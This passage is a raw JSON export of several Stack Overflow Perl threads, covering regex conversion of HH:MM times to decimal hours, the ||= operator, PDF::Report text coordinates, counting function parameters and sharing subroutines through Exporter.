<code>tr/./,/r</code> is used to covert all dots to commas</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nwhile ( &lt;DATA&gt; ) {\n    s{ ( 0[0-9] | 1[0-9] | 2[0-3] ) : ( [0-5][0-9] ) }{\n        sprintf('%.2f', $1 + $2 / 60) =~ tr/./,/r\n    }gex;\n    print;\n}  \n\n__DATA__\n00:00\n05:17\n12:30\n15:59\n23:59\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>0,00\n5,28\n12,50\n15,98\n23,98\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1462969596, "post_id": 37162630, "comment_id": 61860544, "body": "You never need grep when you&#39;re using awk since awk can do anything useful that grep can do."}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1462970201, "post_id": 37162630, "comment_id": 61861039, "body": "@EdMorton Unless you want to use grep -o, which is a pain to replicate in awk although in this case it is pointless to use the -o option."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 1, "creation_date": 1462970432, "post_id": 37162630, "comment_id": 61861217, "body": "@123 <code>grep -o &#39;foo&#39;</code> = <code>awk -vRS=&#39;foo&#39; &#39;{print RT}&#39;</code>. Both use GNU tools. nbd."}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 1, "creation_date": 1462970679, "post_id": 37162630, "comment_id": 61861433, "body": "@EdMorton Yeah i suppose."}, {"owner": {"reputation": 430, "user_id": 2635790, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6I9kD.png?s=128&g=1", "display_name": "ej_f", "link": "https://stackoverflow.com/users/2635790/ej-f"}, "edited": false, "score": 0, "creation_date": 1462971051, "post_id": 37162630, "comment_id": 61861764, "body": "Well, is only a proposal. If you have a file with messy dates, it should work. Thanks for shared the <code>awk</code> equivalent."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 1, "creation_date": 1462974498, "post_id": 37162630, "comment_id": 61864725, "body": "You&#39;re welcome. There&#39;s no question it&#39;d do the job too, its just not necessary since you&#39;re adding an extra tool and a pipe and passing the output to a tool that could&#39;ve done the job itself. FYI another way to do it in awk is <code>awk -v FPAT=&#39;foo&#39; &#39;{for (i=1;i&lt;=NF;i++) print $i}&#39; file</code>. Which is the best approach depends on your additional requirements such as any delimiters you want to search between and what you&#39;re going to do with the matching strings after you find them. In this case it&#39;d be <code>echo 12:30 | awk -v RS=&#39;([0[0-9]|1[0-9]|2[0-3]):([0-5][0-9])&#39; -F&quot;:&quot; &#39;{$0=RT; printf $1+$2&#47;60}&#39;</code>."}], "tags": [], "owner": {"reputation": 430, "user_id": 2635790, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6I9kD.png?s=128&g=1", "display_name": "ej_f", "link": "https://stackoverflow.com/users/2635790/ej-f"}, "is_accepted": false, "score": 0, "last_activity_date": 1462969963, "last_edit_date": 1462969963, "creation_date": 1462969482, "answer_id": 37162630, "question_id": 37162208, "link": "https://stackoverflow.com/questions/37162208/convert-hhmm-into-decimal-hours/37162630#37162630", "title": "Convert HH:MM into decimal hours", "body": "<p>You could use <code>egrep</code> and <code>awk</code>:</p>\n\n<pre><code>$ echo 12:30 | egrep -o '([0[0-9]|1[0-9]|2[0-3]):([0-5][0-9])' | awk -F\":\" '{printf $1+$2/60}'\n12.5\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15376, "user_id": 588916, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b9737fb0439f70903f8948ad3963d9cc?s=128&d=identicon&r=PG", "display_name": "collapsar", "link": "https://stackoverflow.com/users/588916/collapsar"}, "is_accepted": true, "score": 0, "last_activity_date": 1462970281, "last_edit_date": 1462970281, "creation_date": 1462969745, "answer_id": 37162735, "question_id": 37162208, "link": "https://stackoverflow.com/questions/37162208/convert-hhmm-into-decimal-hours/37162735#37162735", "title": "Convert HH:MM into decimal hours", "body": "<p>You only have to adjust the substitution tomake it work:</p>\n\n<pre><code>$line =~ s/(0[0-9]|1[0-9]|2[0-3]):([0-5][0-9])/\"$1,\" . substr( int($2)\\/60, 2)/eg;\n</code></pre>\n\n<p>The <code>e</code> modifier causes the substituting content to be <code>eval</code>'ed, thus you can write the intended result as kind of a formula contingent on the capture group contents. Note that the <code>substr</code> call eliminates the leading <code>0,</code> in the string representation of fractions.</p>\n\n<p>If you need to limit your self to a given number of fraction digits, format the result of the division using <code>sprintf</code>:</p>\n\n<pre><code>$line =~ s/(0[0-9]|1[0-9]|2[0-3]):([0-5][0-9])/\"$1,\" . substr( sprintf('%.2f', int($2)\\/60), 2)/eg;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1462970272, "post_id": 37162796, "comment_id": 61861092, "body": "may want to change the regex to only match times, but otherwise good answer."}], "tags": [], "owner": {"reputation": 41, "user_id": 6320360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/865a234d0e895cabe36edcc3e5e48d83?s=128&d=identicon&r=PG&f=1", "display_name": "Suzie", "link": "https://stackoverflow.com/users/6320360/suzie"}, "is_accepted": false, "score": 1, "last_activity_date": 1462970238, "last_edit_date": 1462970238, "creation_date": 1462969865, "answer_id": 37162796, "question_id": 37162208, "link": "https://stackoverflow.com/questions/37162208/convert-hhmm-into-decimal-hours/37162796#37162796", "title": "Convert HH:MM into decimal hours", "body": "<pre><code>perl -ple 's|(\\d\\d):(\\d\\d)|{$2/60 + $1}|eg'\n</code></pre>\n\n<p>Your locale should take care of the comma, i think</p>\n"}, {"tags": [], "owner": {"reputation": 2749, "user_id": 482519, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ff5fbaf09cb6d70cefb999871591b3de?s=128&d=identicon&r=PG", "display_name": "ernix", "link": "https://stackoverflow.com/users/482519/ernix"}, "is_accepted": false, "score": 0, "last_activity_date": 1462979992, "creation_date": 1462979992, "answer_id": 37166948, "question_id": 37162208, "link": "https://stackoverflow.com/questions/37162208/convert-hhmm-into-decimal-hours/37166948#37166948", "title": "Convert HH:MM into decimal hours", "body": "<p>Assume your <code>LC_NUMERIC</code> is correct:</p>\n\n<pre><code>while (&lt;FILE&gt;) {\n    use locale ':not_characters';\n    my $line = $_;\n    $line =~ s!\\b([01][0-9]|2[0-3]):([0-5][0-9])\\b!$1 + $2/60!eg;\n    print $line;\n}\n</code></pre>\n"}], "owner": {"reputation": 340, "user_id": 3689007, "user_type": "registered", "accept_rate": 58, "profile_image": "https://i.stack.imgur.com/6NHYN.png?s=128&g=1", "display_name": "Macieyo", "link": "https://stackoverflow.com/users/3689007/macieyo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 176, "favorite_count": 0, "accepted_answer_id": 37162735, "answer_count": 6, "score": 0, "last_activity_date": 1467562902, "creation_date": 1462968429, "last_edit_date": 1462969955, "question_id": 37162208, "link": "https://stackoverflow.com/questions/37162208/convert-hhmm-into-decimal-hours", "title": "Convert HH:MM into decimal hours", "body": "<p>I am trying to convert some time stamps from text file in format HH:MM into number format (for example, <code>12:30</code> -> <code>12,5</code>)<sup>1</sup> using a Perl regex for easier processing in future.</p>\n\n<p>I am quite new in this topic so I am struggling with MM part and I don't know how to convert it. Currently I have something like this:</p>\n\n<pre><code>while ( &lt;FILE&gt; ) {\n    $line = $_;\n    $line =~ s/([0[0-9]|1[0-9]|2[0-3]):([0-5][0-9])/$2,$1/g;\n    print $line;    \n}  \n</code></pre>\n\n<hr>\n\n<p>1) In my locale, the comma <code>,</code> is used for decimal points. Imagine a <code>.</code> So this means 12 and a half, or 12.5.</p>\n"}, {"tags": ["perl", "operators", "perl-module", "assignment-operator"], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462963579, "post_id": 37160018, "comment_id": 61856145, "body": "I&#39;m not sure if that is a typical operation - because it&#39;d still work based on being <code>defined</code> or not. I&#39;d probably suggest an &quot;or-cache&quot; type answer: <code>$cache{$key} ||= calculate_some_value_for($key);</code>"}], "tags": [], "owner": {"reputation": 6068, "user_id": 1799189, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/s4Pcu.jpg?s=128&g=1", "display_name": "xxfelixxx", "link": "https://stackoverflow.com/users/1799189/xxfelixxx"}, "is_accepted": false, "score": 0, "last_activity_date": 1462964318, "last_edit_date": 1462964318, "creation_date": 1462962790, "answer_id": 37160018, "question_id": 37159887, "link": "https://stackoverflow.com/questions/37159887/what-is-the-use-of-assignment-operator-in-perl-scripting/37160018#37160018", "title": "What is the use of &#39;||=&#39; assignment operator in perl scripting?", "body": "<p><code>||=</code> means 'or equals', so if MaxRow is <code>0</code> or any other false value, MaxRow will get set to the value of MinRow.</p>\n\n<p><code>||=</code> is one of the Assignment Operators which is well described in\n<a href=\"http://perldoc.perl.org/perlop.html#Assignment-Operators\" rel=\"nofollow\"><code>perldoc perlop</code></a> </p>\n\n<p>A common use for <code>||=</code> would be to define a default value for optional subroutine variables.</p>\n\n<pre><code>my $data = { foo =&gt; 123, bar =&gt; 456, baz =&gt; 789 };\nprocess($data);\n\nsub process {\n    my ($data, $is_special) = @_;\n    $is_special ||= 0; # Typically not special\n    do_something($data);\n    do_special($data) if $is_special;\n}\n</code></pre>\n\n<p>As Sobrique suggests, an 'or-cache' is another common use case to save yourself computing some expensive function.</p>\n\n<pre><code>my $fib_cache = [];\nsub fib {\n    my ($n) = @_;\n    return 1 if ($n == 0);\n    return 1 if ($n == 1);\n    $fib_cache-&gt;[$n] ||= fib($n-1) + fib($n-2); # Only compute if not seen before.\n    sleep(1); # To make this slow enough...\n    return $fib_cache-&gt;[$n];\n}\n\nprint \"Fib 10 is \" . fib(10) . \"\\n\";   # Takes 10 seconds...\nprint \"Fib 10 is \" . fib(10) . \"\\n\";   # Instant\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 6319755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/09caa8fe82fe6bd7462f84884e726b4b?s=128&d=identicon&r=PG&f=1", "display_name": "Venkat Kumar", "link": "https://stackoverflow.com/users/6319755/venkat-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 279, "favorite_count": 0, "closed_date": 1462968794, "answer_count": 1, "score": 0, "last_activity_date": 1462964318, "creation_date": 1462962449, "last_edit_date": 1462963424, "question_id": 37159887, "link": "https://stackoverflow.com/questions/37159887/what-is-the-use-of-assignment-operator-in-perl-scripting", "closed_reason": "Duplicate", "title": "What is the use of &#39;||=&#39; assignment operator in perl scripting?", "body": "<p>I am using this line of code :</p>\n\n<pre><code>$sheet -&gt; {MaxRow} ||= $sheet -&gt; {MinRow};\n</code></pre>\n\n<p>in my script. \nI don't understand help me.</p>\n"}, {"tags": ["perl", "pdf"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462966527, "post_id": 37158192, "comment_id": 61858162, "body": "You need to clarify what you want to do. Please <a href=\"https://stackoverflow.com/posts/37158192/edit\">edit</a> your question. Do you want to read an existing PDF and get the coordinates in relation to the page dimension of an existing text in that document, or do want something else that involves a new, empty PDF file?"}, {"owner": {"reputation": 17, "user_id": 6289013, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/OiQ54.jpg?s=128&g=1", "display_name": "selva kumar", "link": "https://stackoverflow.com/users/6289013/selva-kumar"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462968845, "post_id": 37158192, "comment_id": 61859991, "body": "i need to get the coordinates of each and every  character in existing pdf file... @simbabque"}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 6289013, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/OiQ54.jpg?s=128&g=1", "display_name": "selva kumar", "link": "https://stackoverflow.com/users/6289013/selva-kumar"}, "edited": false, "score": 0, "creation_date": 1462963883, "post_id": 37160007, "comment_id": 61856349, "body": "thank you Borodin...i tried that getAddTextPos but showing error                  Use of uninitialized value $hPos in concatenation (.) or string at pdf_report.pl line 34."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 17, "user_id": 6289013, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/OiQ54.jpg?s=128&g=1", "display_name": "selva kumar", "link": "https://stackoverflow.com/users/6289013/selva-kumar"}, "edited": false, "score": 1, "creation_date": 1462965032, "post_id": 37160007, "comment_id": 61857159, "body": "@selva: I don&#39;t see any way around those warnings without editing the module file. The documentation invites you to omit some call parameters, but the code just checks them directly with a regex pattern without first making sure they&#39;re undefined. I think it&#39;s just a very badly-written module. Note that the superclass <code>PDF::API2</code> has the rather worrying line <code>no warnings qw[ deprecated recursion uninitialized ]</code>"}, {"owner": {"reputation": 17, "user_id": 6289013, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/OiQ54.jpg?s=128&g=1", "display_name": "selva kumar", "link": "https://stackoverflow.com/users/6289013/selva-kumar"}, "edited": false, "score": 0, "creation_date": 1462970012, "post_id": 37160007, "comment_id": 61860880, "body": "thank you..if you have any any idea about how  to get the position of each and every character in existing pdf file means kindly share...@Borodin"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1462962757, "creation_date": 1462962757, "answer_id": 37160007, "question_id": 37158192, "link": "https://stackoverflow.com/questions/37158192/is-there-any-way-to-get-the-coordinates-of-a-word-using-pdfreport/37160007#37160007", "title": "Is there any way to get the coordinates of a word using PDF::Report?", "body": "<p>The <a href=\"https://metacpan.org/pod/PDF::Report\" rel=\"nofollow\"><code>PDF::Report</code></a> module is for <em>creating</em> PDF files. It keeps a current horizontal and vertical position where text will be added with calls to <code>addText</code> will be placed. That is the position that is returned by <code>getAddTextPos</code> (and may be modified with <code>setAddTextPos</code>)</p>\n\n<p>It's unclear what you mean by <em>\"get the coordinates of a word\"</em>. <code>getAddTextPos</code> doesn't take any parameters, and will return the coordinates where the <em>next</em> word will be added unless word wrap is invoked</p>\n"}], "owner": {"reputation": 17, "user_id": 6289013, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/OiQ54.jpg?s=128&g=1", "display_name": "selva kumar", "link": "https://stackoverflow.com/users/6289013/selva-kumar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1462962757, "creation_date": 1462958376, "last_edit_date": 1462961812, "question_id": 37158192, "link": "https://stackoverflow.com/questions/37158192/is-there-any-way-to-get-the-coordinates-of-a-word-using-pdfreport", "title": "Is there any way to get the coordinates of a word using PDF::Report?", "body": "<p>I am using the <a href=\"https://metacpan.org/pod/PDF::Report\" rel=\"nofollow\"><code>PDF::Report</code></a> module.</p>\n\n<p>I tried this but I am not getting any text position.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse PDF::Report;\n\nmy $filename = \"pdffile.pdf\";\nmy $pdf      = new PDF::Report(File =&gt; $filename);\n\nmy $pages = $pdf-&gt;pages();\nprint \"$pages \\n\";\n\nmy $fname = $pdf-&gt;getFont();\nprint \"$fname \\n\";\n\nmy $String = \"APR\u00c8S \";\n\nmy $string_w = $pdf-&gt;getStringWidth($String);\nprint \"$string_w \\n\";\n\nmy ($hPos, $vPos) = $pdf-&gt;getAddTextPos($String);\nprint \"$hPos &amp; $vPos \\n\";  \n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 4663, "user_id": 3967089, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77d00715119003023d62918dcc603ca7?s=128&d=identicon&r=PG&f=1", "display_name": "Calle Dybedahl", "link": "https://stackoverflow.com/users/3967089/calle-dybedahl"}, "edited": false, "score": 3, "creation_date": 1462956651, "post_id": 37157344, "comment_id": 61851296, "body": "<code>say &quot;2&quot;;</code>  If you intended to ask how you can have Perl figure out the number of arguments, you should probably say what language the function is supposed to be in, so people have a reasonable chance to guess at the expected syntax."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462956862, "post_id": 37157344, "comment_id": 61851442, "body": "<code>print scalar split &#47;,&#47;, m&#47;\\(([^)]+)\\)&#47;; </code>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1462957324, "post_id": 37157344, "comment_id": 61851784, "body": "Yeah, trying to be too clever. How about <code>perl -lne &#39;print scalar split &#47;,&#47;, (m&#47;\\(([^)]+)\\)&#47;)[0]&#39;</code> - that&#39;ll only work for the first declaration on each line, and only works if all the lines look the same (e.g. no line breaks)."}, {"owner": {"reputation": 1, "user_id": 5972181, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c92dc07b259b629b2492de992e618d1?s=128&d=identicon&r=PG&f=1", "display_name": "Saikiran Reddy", "link": "https://stackoverflow.com/users/5972181/saikiran-reddy"}, "edited": false, "score": 0, "creation_date": 1463030755, "post_id": 37157344, "comment_id": 61889944, "body": "thanks for the reply.sorry,i could not get the meaning of above regular expression."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 5972181, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c92dc07b259b629b2492de992e618d1?s=128&d=identicon&r=PG&f=1", "display_name": "Saikiran Reddy", "link": "https://stackoverflow.com/users/5972181/saikiran-reddy"}, "edited": false, "score": 0, "creation_date": 1463030658, "post_id": 37164098, "comment_id": 61889910, "body": "Thanks for the reply.But the purpose of asking the question is to find the number of arguments in that function and i should only place the number of argument but not the entire line"}], "tags": [], "owner": {"reputation": 41, "user_id": 6320360, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/865a234d0e895cabe36edcc3e5e48d83?s=128&d=identicon&r=PG&f=1", "display_name": "Suzie", "link": "https://stackoverflow.com/users/6320360/suzie"}, "is_accepted": false, "score": 0, "last_activity_date": 1462973120, "creation_date": 1462973120, "answer_id": 37164098, "question_id": 37157344, "link": "https://stackoverflow.com/questions/37157344/perl-regular-expressions-for-finding-the-number-of-parameters-of-a-given-functio/37164098#37164098", "title": "perl regular expressions for finding the number of parameters of a given function", "body": "<p>Why strip it to much? If there's one function declaration per line, then</p>\n\n<pre><code>echo 'UINT8 function(UINT16 *num1, UINT32 num2)' | perl -nle 'print scalar split \",\"'\n</code></pre>\n\n<p>If something else was wanted, please be more specific with your question.</p>\n"}], "owner": {"reputation": 1, "user_id": 5972181, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c92dc07b259b629b2492de992e618d1?s=128&d=identicon&r=PG&f=1", "display_name": "Saikiran Reddy", "link": "https://stackoverflow.com/users/5972181/saikiran-reddy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 37, "favorite_count": 0, "answer_count": 1, "score": -4, "last_activity_date": 1462973120, "creation_date": 1462956240, "question_id": 37157344, "link": "https://stackoverflow.com/questions/37157344/perl-regular-expressions-for-finding-the-number-of-parameters-of-a-given-functio", "title": "perl regular expressions for finding the number of parameters of a given function", "body": "<p>UINT8 function(UINT16 *num1, UINT32 num2)</p>\n\n<p>how can i print the number of parameters for the above function using perl script?</p>\n\n<p>example:</p>\n\n<p>the above function has two parameters .so, i need it to be printed as 2.</p>\n"}, {"tags": ["perl", "perl-module", "data-sharing"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 4, "creation_date": 1462955796, "post_id": 37157103, "comment_id": 61850751, "body": "There&#39;s plenty of documentation on how  to create modules. <a href=\"http://perldoc.perl.org/perlmod.html\" rel=\"nofollow noreferrer\">perlmod</a> for example. However, without a clearer explanation, we can&#39;t really answer your question. What are you actually trying to accomplish?"}, {"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 1, "creation_date": 1462957173, "post_id": 37157103, "comment_id": 61851686, "body": "You could bless an object of your module and then use it access variables, subroutines in your main.pl. For using a variable you will be using <code>$module::variablename</code>. Let me know if this clarifies things."}, {"owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "reply_to_user": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1462972294, "post_id": 37157103, "comment_id": 61862864, "body": "@AbhiNickz : i did that to access variable, how to do the same for function?"}, {"owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "reply_to_user": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 1, "creation_date": 1462972875, "post_id": 37157103, "comment_id": 61863356, "body": "@AbhiNickz: i got it , we have to use &amp;modulename::function()"}], "answers": [{"comments": [{"owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "edited": false, "score": 0, "creation_date": 1462972970, "post_id": 37162330, "comment_id": 61863437, "body": "parse_yaml() subroutine is written to take variable values from my yaml file. Loadfile just gives the pointer (reference0 to the first object in Yaml."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 1, "last_activity_date": 1467562922, "last_edit_date": 1467562922, "creation_date": 1462968706, "answer_id": 37162330, "question_id": 37157103, "link": "https://stackoverflow.com/questions/37157103/perl-how-to-share-variables-and-subroutines-across-various-perl-files/37162330#37162330", "title": "perl : how to share variables and subroutines across various perl files", "body": "<p>Basically you need to <em>import</em> the <code>parse_yaml</code> subroutine into you current program, rather than trying to export the value of the parameter, but I'm uncertain why you have written your own <code>parse_yaml</code> utility when <code>YAML::XS::LoadFile</code> has already done it for you</p>\n\n<p>This is all very clearly described in the documentation for the <a href=\"https://metacpan.org/pod/Exporter\" rel=\"nofollow\"><code>Exporter</code></a> module</p>\n\n<p>Here's a brief example</p>\n\n<h3>main.pl</h3>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse YAML::XS 'LoadFile';\nuse MyUtils 'parse_yaml';\n\nmy $input_file = 'data.yaml';\n\nmy $yaml_input = LoadFile($input_file);\n\nparse_yaml($input_file);\n# this variable has to be passed to the function parse_yaml which is in other file.\n</code></pre>\n\n<h3>MyUtils.pm</h3>\n\n<pre><code>package MyUtils;\n\nuse strict;\nuse warnings;\n\nuse Exporter 'import';\n\nour @EXPORT_OK = 'parse_yaml';\n\nsub parse_yaml {\n    my ($yaml_file) = @_;\n\n    # some processing\n}\n\n1;\n</code></pre>\n"}], "owner": {"reputation": 57, "user_id": 1814300, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/89276a0bf4a6744ed172bb2819dc348d?s=128&d=identicon&r=PG", "display_name": "hanish", "link": "https://stackoverflow.com/users/1814300/hanish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 151, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1467562922, "creation_date": 1462955511, "last_edit_date": 1462972359, "question_id": 37157103, "link": "https://stackoverflow.com/questions/37157103/perl-how-to-share-variables-and-subroutines-across-various-perl-files", "title": "perl : how to share variables and subroutines across various perl files", "body": "<p>I am trying something of this sort:</p>\n\n<p>main.pl</p>\n\n<pre><code>use YAML::XS\nour $yaml_input = YAML::XS::LoadFile(\"$input_file\");\nparse_yaml($yaml_input); \n#this variable has to be passed to the function parse_yaml which is in other file.\n</code></pre>\n\n<p>parser.pl</p>\n\n<pre><code>sub parse_yaml($yaml_input)\n{\n#some processing\n}\n</code></pre>\n\n<p>I have read few answers about using a package but how do we use it in this case.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1462950225, "post_id": 37154968, "comment_id": 61847307, "body": "Welcome to Stack Overflow and the Perl tag. Please take a moment to take the <a href=\"https://stackoverflow.com/tour\">tour</a> to learn how to use this site. :)"}], "answers": [{"tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": 1, "last_activity_date": 1462949256, "creation_date": 1462949256, "answer_id": 37155022, "question_id": 37154968, "link": "https://stackoverflow.com/questions/37154968/matching-two-chars-with-multiple-lines-in-between/37155022#37155022", "title": "matching two chars with 